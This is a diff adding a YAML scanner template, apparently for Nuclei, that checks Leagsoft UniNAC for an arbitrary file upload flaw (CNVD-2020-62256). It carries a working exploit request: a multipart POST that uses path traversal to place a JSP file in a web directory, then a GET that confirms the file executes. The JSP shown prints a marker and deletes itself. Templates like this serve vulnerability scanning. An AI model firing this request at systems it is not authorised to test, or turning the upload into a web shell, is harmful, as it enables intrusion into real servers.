@@ -1,0 +1,37 @@
+id: yaml-poc-leagsoft-uninac-file_upload-CNVD-2020-62256
+info:
+  name: Yaml Poc Leagsoft Uninac File_Upload Cnvd 2020 62256
+  author: converted
+  severity: critical
+  description: 'Converted from xpoc: yaml-poc-leagsoft-uninac-file_upload-CNVD-2020-62256'
+  tags: fileupload
+  reference:
+  - https://wiki.96.mk/Web%E5%AE%89%E5%85%A8/%E8%81%94%E8%BD%AF%E7%A7%91%E6%8A%80/%E8%81%94%E8%BD%AF%E5%87%86%E5%85%A5%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/
+http:
+- method: POST
+  path:
+  - /uai/download/uploadfileToPath.htm
+  body: "--{{rBoundary}}\r\nContent-Disposition: form-data; name=\"input_localfile\"\
+    ; filename=\"{{rFilename}}.jsp\"\r\nContent-Type: text/plain\r\n\r\n<%out.print(\"\
+    {{rContent}}\");new java.io.File(application.getRealPath(request.getServletPath())).delete();%>\r\
+    \n--{{rBoundary}}\r\nContent-Disposition: form-data; name=\"uploadpath\";\r\n\r\
+    \n../webapps/notifymsg/devreport/\r\n--{{rBoundary}}--\r\n"
+  headers:
+    Content-Type: multipart/form-data; boundary={{rBoundary}}
+  matchers-condition: and
+  matchers:
+  - type: status
+    status:
+    - 200
+  - type: word
+    part: body
+    words:
+    - 文件上传成功
+- method: GET
+  path:
+  - /notifymsg/devreport/{{rFilename}}.jsp
+  matchers-condition: and
+  matchers:
+  - type: status
+    status:
+    - 200
